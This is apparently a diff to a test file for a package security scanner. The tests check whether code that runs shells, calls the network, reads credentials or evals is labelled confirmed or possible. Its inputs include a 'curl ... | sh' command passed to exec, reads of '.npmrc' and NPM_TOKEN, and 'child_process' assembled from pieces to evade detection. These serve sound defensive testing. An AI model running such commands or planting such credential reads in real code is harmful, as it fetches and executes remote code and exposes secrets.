@@ -1,6 +1,8 @@
-// Precision of the source rules (apm-score-v4): evidence must support its label. Code rules match code, not
-// comments, regex literals or ordinary strings; what is only named is `possible`. The second half checks that
-// the lexer cannot be steered into hiding code. Payloads are inert stand-ins.
+// Precision of the source rules: evidence must support its label. Code rules match code, not comments or regex
+// literals (apm-score-v4); what is only named is `possible`. Since apm-score-v7 a match apm-score-v3 made in code or
+// a string stands unless the tree proves it harmless (a string only compared, or held where nothing reads it), so
+// several cases below show both sides: the same text held where apm cannot see every reader, and where it can. The
+// second half checks that the lexer cannot be steered into hiding code. Payloads are inert stand-ins.
 import { describe, expect, test } from "bun:test";
 import { analyze, finalize, POINTS, POSSIBLE_POINTS, type Analysis, type TarEntry } from "../src/index.ts";
 import { scanText, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";
@@ -47,9 +49,11 @@ describe("evidence that does not support its label", () => {
     expect(found("x(); // see `.fetch()`, the entry point\n")).toEqual({});
   });
 
-  test("a call written inside an ordinary string is text, not a call", () => {
-    expect(found('throw new Error("fetch() returned undefined");\n')).toEqual({});
-    expect(found('const d = "Disallow the use of `eval()`";\n')).toEqual({});
+  test("a call written inside an ordinary string is text where the string provably goes nowhere that runs it", () => {
+    expect(found('function f(e) { return e.message === "fetch() returned undefined" }\n')).toEqual({});
+    expect(found('function f() { const d = "Disallow the use of `eval()`"; }\n')).toEqual({});
+    // an error's message leaves with it, and whatever catches it may run it: v3's verdict stands
+    expect(found('throw new Error("fetch() returned undefined");\n')).toEqual({ network: "confirmed" });
   });
 
   test("function and method definitions are not calls", () => {
@@ -75,31 +79,37 @@ describe("evidence that does not support its label", () => {
 });
 
 describe("confirmed versus possible", () => {
-  test("a module specifier or a call's argument confirms; a name in a list is possible", () => {
+  test("a module specifier or a call's argument confirms; a name only compared is possible", () => {
     expect(found("const cp = require('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
     expect(found("import 'node:child_process';\n")).toEqual({ "shell-exec": "confirmed" });
-    expect(found('const builtins = ["buffer", "child_process", "fs"];\n')).toEqual({ "shell-exec": "possible" });
+    expect(found('function isRunner(name) { return name === "child_process" }\n')).toEqual({ "shell-exec": "possible" });
+    // a list another script or module can read may be handed to require: v3's verdict stands
+    expect(found('const builtins = ["buffer", "child_process", "fs"];\n')).toEqual({ "shell-exec": "confirmed" });
   });
 
-  test("shell text is confirmed when a call runs it, possible when it is only held", () => {
+  test("shell text is confirmed when a call runs it, or when apm cannot see every place it goes", () => {
     expect(found("cp.exec('curl -s https://example.invalid/x | sh');\n")["shell-exec"]).toBe("confirmed");
-    expect(found("const help = 'install with: curl -s https://example.invalid/x | sh';\n")["shell-exec"]).toBe("possible");
+    expect(found("function f() { const help = 'install with: curl -s https://example.invalid/x | sh'; }\n")["shell-exec"]).toBe("possible");
+    expect(found("const help = 'install with: curl -s https://example.invalid/x | sh';\n")["shell-exec"]).toBe("confirmed");
   });
 
-  test("a credential path read is confirmed; one in a list of file names is possible", () => {
+  test("a credential path read is confirmed; one held where nothing reads it is possible", () => {
     expect(found("fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n")).toEqual({ "credential-access": "confirmed" });
-    expect(found('const markers = ["package.json", ".npmrc"];\n')).toEqual({ "credential-access": "possible" });
+    expect(found('function root(dir) { const markers = ["package.json", ".npmrc"]; }\n')).toEqual({ "credential-access": "possible" });
+    expect(found('const markers = ["package.json", ".npmrc"];\n')).toEqual({ "credential-access": "confirmed" });
     expect(found("const t = process.env.NPM_TOKEN;\n")).toEqual({ "credential-access": "confirmed" });
   });
 
-  test("aliases and unidentified methods are possible", () => {
-    expect(found("aliasedRequire = require;\n")).toEqual({ eval: "possible" });
-    expect(found("const r = await config.fetch(url);\n")).toEqual({ network: "possible" });
+  test("an alias of require and a method named fetch count as apm-score-v3 counted them", () => {
+    // what they are cannot be proven, so the floor keeps v3's reading; the tree only says why it is unsure
+    expect(found("aliasedRequire = require;\n")).toEqual({ eval: "confirmed" });
+    expect(found("const r = await config.fetch(url);\n")).toEqual({ network: "confirmed" });
+    expect(found("const r = await config.fetch('data:,');\n")).toEqual({});
     expect(found("const r = await globalThis.fetch(url);\n")).toEqual({ network: "confirmed" });
   });
 
   test("a possible signal costs fewer points and says so in its label", () => {
-    const a = analyzeFiles({ "index.js": 'module.exports = ["child_process"];\n' });
+    const a = analyzeFiles({ "index.js": 'module.exports = function () { const names = ["child_process"]; };\n' });
     const s = a.signals.find((x) => x.id === "shell-exec");
     expect(s?.confidence).toBe("possible");
     expect(s?.points).toBe(POSSIBLE_POINTS["shell-exec"]);
@@ -116,7 +126,8 @@ describe("confirmed versus possible", () => {
   });
 
   test("a name joined from pieces but never loaded is possible; loaded, it is confirmed", () => {
-    expect(found("const n = 'chi' + 'ld_' + 'process';\n")["shell-exec"]).toBe("possible");
+    expect(found("function f() { const n = 'chi' + 'ld_' + 'process'; }\n")["shell-exec"]).toBe("possible");
+    expect(found("const n = 'chi' + 'ld_' + 'process';\n")["shell-exec"]).toBe("confirmed");
     expect(found("const cp = require('chi' + 'ld_' + 'process');\n")["shell-exec"]).toBe("confirmed");
   });
 });
